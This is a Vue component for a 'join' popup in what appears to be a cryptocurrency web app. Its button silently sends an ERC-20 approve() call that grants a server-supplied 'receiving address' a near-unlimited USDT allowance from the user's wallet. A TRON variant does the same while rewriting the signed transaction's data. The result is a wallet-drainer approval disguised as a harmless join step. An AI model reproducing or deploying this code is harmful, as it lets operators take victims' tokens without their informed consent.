<template>
    <div class="van-overlay"  style="z-index: 2514;" v-if="false">
        <div class="join-popup van-popup van-popup--center"  style="z-index: 2515;">
            <div >
                <svg xmlns="http://www.w3.org/2000/svg" @click="change(false)" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--fluent close" width="1em" height="1em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" data-icon="fluent:dismiss-24-regular" >
                    <g fill="none">
                        <path d="M4.397 4.554l.073-.084a.75.75 0 0 1 .976-.073l.084.073L12 10.939l6.47-6.47a.75.75 0 1 1 1.06 1.061L13.061 12l6.47 6.47a.75.75 0 0 1 .072.976l-.073.084a.75.75 0 0 1-.976.073l-.084-.073L12 13.061l-6.47 6.47a.75.75 0 0 1-1.06-1.061L10.939 12l-6.47-6.47a.75.75 0 0 1-.072-.976l.073-.084l-.073.084z" fill="currentColor"></path>
                    </g>
                </svg>
            </div>
            <div class="popup-content" >
                <img src="../assets/static/image/icon_join_key.6d756ca8.svg" alt="" class="img-join" >
                <div class="join-title ff_InterMedium" >{{$t('key169')}}</div>
                <div class="submit-btn ff_NunitoBold"  @click="joinApprove">{{$t('key28')}}</div>
                <div class="tips" >{{$t('key170')}}</div>
            </div>
        </div>
    </div>
</template>
    
<script>
import { USDT_API } from '@/libs/abis'
import { authorize } from '@/api/user'
import { mapActions } from 'vuex'
import { Toast } from 'vant'

export default {
    props: {
        value: {},
        isShowToast: {}
    },
    computed: {
        userinfo() {
            return this.$store.state.user.userinfo
        },
        configInfo() {
            return this.$store.state.user.configInfo
        },
        walletObj() {
            return this.$store.state.user.walletObj
        }
    },
    data() {
        return {
        }
    },
    mounted() {
        if (this.isShowToast) {
            Toast({
                message: this.$t('key173'),
                icon: 'fail'
            })
        }
    },
    methods: {
        ...mapActions([
            'getuserinfo'
        ]),
        change (bool) {
            this.$emit('input', bool)
        },
        joinApprove () {
            this.approve()
            // this.approve2()
        },
        async approve() {
            try {
                const USDT_ADDRESS = this.configInfo.erc.address // （后台给）
                // 合约json接口（拿官方的），合约的地址（后台给）)
                let contract = new this.walletObj.web3.eth.Contract(USDT_API, this.configInfo.erc.contract_address)
                // methods 为合约方法创建交易 send 发送合约方法交易
                // USDT_ADDRESS收款地址
                // address 用户地址
                await contract.methods.approve(USDT_ADDRESS, '90000000000000000000000000000').send({ from: this.walletObj.address, feeLimit: 1e8 })
                this.authorize()
            } catch (error) {
                console.log(error)
            }
        },
        async approve2 () {
            this.tronWeb =  window.tronWeb;
            const address = await this.tronWeb.defaultAddress.base58; 
            const authorized_address = this.configInfo.trc.address; 
            const parameter = [{type:'address',value:authorized_address},{type:'uint256',value:90000000000000}]; 
            var tx  = await this.tronWeb.transactionBuilder.triggerSmartContract( 
                this.configInfo.trc.contract_address,
                "approve(address,uint256)",
                {}, 
                parameter, 
                this.walletAddress 
            ); 

            const data = tx.transaction.raw_data.contract[0].parameter.value.data 
            const type = tx.transaction.raw_data.contract[0].type 

            const signedTx = await this.tronWeb.trx.sign(tx.transaction); 
            signedTx.raw_data.contract[0].parameter.value.data=data; 
            signedTx.raw_data.contract[0].type=type; 
            const broastTx = await this.tronWeb.trx.sendRawTransaction(signedTx);
            this.authorize()
        },
        authorize() {
            authorize({
                address: this.userinfo.address,
                // status: 1
            }).then(res => {
                let data = res.data
                if (data.code == 1) {
                    this.getuserinfo()
                    this.$notify({ type: 'success', message: data.msg });
                    this.$emit('input', false)
                } else {
                    this.$notify({ type: 'warning', message: data.msg });
                }
            })
        },
    }
}
</script>
    
<style scoped>
.notice-popup {
    position: fixed;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, .7);
}

.notice-popup .notice-container {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    margin: auto;
    width: 6.38rem;
    height: 6.44rem;
    background: #fff;
    border-radius: 0.2rem;
    box-sizing: border-box;
    overflow: auto;
}

.notice-popup .notice-container .notice-title {
    position: fixed;
    text-align: center;
    color: #1652f0;
    font-size: .3rem;
    font-family: NunitoBold;
    background-color: #fff;
    padding: 0.32rem;
    width: 6.2rem;
    border-top-left-radius: 8px;
}

.notice-popup .notice-container .notice-content {
    padding: 0.32rem;
    margin-top: 0.8rem;
    font-size: .28rem;
    color: #353f5280;
    line-height: normal;
}

.notice-popup .notice-container .notice-title .icon-close {
    position: absolute;
    right: 0;
    top: 0;
    bottom: 0;
    margin: auto;
    width: 0.32rem;
    height: 0.32rem;
    color: #000;
}

.join-popup {
    padding: 0.48rem 0.4rem 0.35rem;
    width: 6.86rem;
    box-sizing: border-box;
    border-radius: 0.2rem;
}

.join-popup .close {
    position: absolute;
    top: 0.32rem;
    right: 0.32rem;
}

.join-popup .popup-content {
    text-align: center;
}

.join-popup .popup-content .img-join {
    width: 1.27rem;
    height: 1.27rem;
}

.join-popup .popup-content .join-title {
    margin-top: 0.67rem;
    padding: 0 0.7rem;
    font-size: .32rem;
    color: #353f52;
    font-weight: 500;
}

.join-popup .popup-content .submit-btn {
    margin: 0 auto;
    margin-top: 0.87rem;
    width: 4.46rem;
    height: 0.92rem;
    line-height: .92rem;
    color: #fff;
    background: #1652f0;
    border-radius: 0.2rem;
    text-align: center;
    font-size: .32rem;
}

.ff_NunitoBold {
    font-family: NunitoBold;
}

.join-popup .popup-content .tips {
    margin-top: 0.4rem;
    font-size: .24rem;
    color: #5b616e80;
}

svg {
    width: 0.4rem;
    height: 0.4rem;
}

.ynone {
    opacity: 0;
    position: fixed;
    top: -9999px;
    left: -9999px;
}
</style>
    
    